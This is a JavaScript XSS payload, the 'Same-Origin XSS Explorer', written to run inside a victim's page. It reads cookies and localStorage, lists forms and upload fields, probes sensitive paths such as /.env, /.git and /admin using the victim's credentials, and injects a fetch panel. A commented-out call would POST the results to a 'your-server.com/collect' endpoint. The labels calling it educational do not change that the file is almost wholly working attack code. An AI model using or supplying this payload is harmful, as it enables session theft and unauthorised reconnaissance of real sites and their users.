
(function() {
    console.log('%c=== Same-Origin XSS Explorer ===', 'color: red; font-size: 16px;');
    console.log('Target:', window.location.origin);
    console.log('Path:', window.location.pathname);
    
    const results = {
        pages: [],
        apis: [],
        files: [],
        forms: [],
        cookies: document.cookie,
        localStorage: []
    };
    
    // 1. DISCOVER PAGES AND LINKS
    console.log('%c[1] Discovering pages...', 'color: blue;');
    const links = document.querySelectorAll('a');
    links.forEach(link => {
        if(link.href && link.href.startsWith(window.location.origin)) {
            results.pages.push(link.href);
            console.log('Found page:', link.href);
        }
    });
    
    // 2. DISCOVER API ENDPOINTS
    console.log('%c[2] Discovering API endpoints...', 'color: blue;');
    const scripts = document.querySelectorAll('script[src]');
    scripts.forEach(script => {
        if(script.src.includes('/api/') || script.src.includes('/v1/') || script.src.includes('/rest/')) {
            results.apis.push(script.src);
            console.log('Found API:', script.src);
        }
    });
    
    // 3. CHECK LOCALSTORAGE
    console.log('%c[3] Checking localStorage...', 'color: blue;');
    for(let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        let value = localStorage.getItem(key);
        results.localStorage.push({key, value: value.substring(0, 50)});
        console.log('localStorage:', key, '=', value.substring(0, 50));
    }
    
    // 4. FIND FORMS AND INPUTS
    console.log('%c[4] Finding forms...', 'color: blue;');
    const forms = document.querySelectorAll('form');
    forms.forEach((form, index) => {
        const formData = {
            action: form.action,
            method: form.method,
            inputs: []
        };
        
        const inputs = form.querySelectorAll('input');
        inputs.forEach(input => {
            if(input.name) {
                formData.inputs.push({
                    name: input.name,
                    type: input.type
                });
            }
        });
        
        results.forms.push(formData);
        console.log('Form', index + 1, ':', form.action || '[same page]');
    });
    
    // 5. PROBE COMMON DIRECTORIES
    console.log('%c[5] Probing common directories...', 'color: blue;');
    const commonPaths = [
        '/admin', '/dashboard', '/user', '/profile',
        '/api/users', '/api/data', '/api/config',
        '/files', '/uploads', '/documents', '/images',
        '/backup', '/backups', '/temp', '/logs',
        '/config', '/settings', '/.git', '/.env',
        '/download', '/export', '/import', '/manage'
    ];
    
    async function probePaths() {
        for(const path of commonPaths) {
            try {
                const response = await fetch(path, {
                    method: 'GET',
                    credentials: 'include',
                    headers: {
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                });
                
                if(response.ok) {
                    const contentType = response.headers.get('content-type');
                    console.log('%c✅ Found: ' + path, 'color: green;', 
                              'Status:', response.status, 
                              'Type:', contentType);
                    
                    // Try to get content if it looks like JSON
                    if(contentType && contentType.includes('application/json')) {
                        const data = await response.json();
                        console.log('Data:', data);
                    }
                } else if(response.status === 403) {
                    console.log('%c🔒 Forbidden: ' + path, 'color: orange;');
                }
            } catch(e) {
                // Silent fail
            }
        }
    }
    
    probePaths();
    
    // 6. CHECK FOR FILE UPLOAD FUNCTIONALITY
    console.log('%c[6] Checking file upload functionality...', 'color: blue;');
    const fileInputs = document.querySelectorAll('input[type="file"]');
    fileInputs.forEach((input, index) => {
        console.log('File upload field found:', input.name || 'unnamed');
        
        // Get the parent form
        const form = input.closest('form');
        if(form) {
            console.log('  Upload URL:', form.action || window.location.href);
            console.log('  Method:', form.method || 'POST');
        }
    });
    
    // 7. CREATE AN EXPLORATION INTERFACE (for educational purposes)
    function createExplorer() {
        const explorerDiv = document.createElement('div');
        explorerDiv.innerHTML = `
            <div style="position: fixed; top: 10px; right: 10px; background: white; 
                        border: 2px solid red; padding: 10px; z-index: 9999;
                        max-height: 400px; overflow: auto; width: 300px;
                        font-family: monospace; font-size: 12px;">
                <h3 style="margin:0 0 10px 0;">🔍 Same-Origin Explorer</h3>
                <div id="explorer-content">
                    <button onclick="explorerFetch('/')">Fetch Root</button>
                    <button onclick="explorerFetch('/api')">Fetch API</button>
                    <button onclick="explorerFetch('/admin')">Fetch Admin</button>
                    <div id="explorer-results" style="margin-top:10px;"></div>
                </div>
            </div>
        `;
        document.body.appendChild(explorerDiv);
        
        window.explorerFetch = async (url) => {
            const resultsDiv = document.getElementById('explorer-results');
            resultsDiv.innerHTML = 'Fetching ' + url + '...';
            
            try {
                const response = await fetch(url, {
                    credentials: 'include'
                });
                
                if(response.ok) {
                    const text = await response.text();
                    resultsDiv.innerHTML = `
                        <strong>✅ ${url}</strong><br>
                        Status: ${response.status}<br>
                        Content-Type: ${response.headers.get('content-type')}<br>
                        <textarea style="width:100%; height:100px;">${text.substring(0, 200)}...</textarea>
                    `;
                } else {
                    resultsDiv.innerHTML = `<strong>❌ ${url}</strong><br>Status: ${response.status}`;
                }
            } catch(e) {
                resultsDiv.innerHTML = `<strong>Error:</strong> ${e.message}`;
            }
        };
    }
    
    // 8. EXPORT FINDINGS
    function exportResults() {
        console.log('%c=== EXPORTING RESULTS ===', 'color: purple;');
        console.log(JSON.stringify(results, null, 2));
        
        // Send back to your server (educational - requires CORS)
        // fetch('https://your-server.com/collect', {
        //     method: 'POST',
        //     body: JSON.stringify(results)
        // });
    }
    
    // Run after a delay
    setTimeout(() => {
        createExplorer();
        exportResults();
    }, 1000);
    
})();
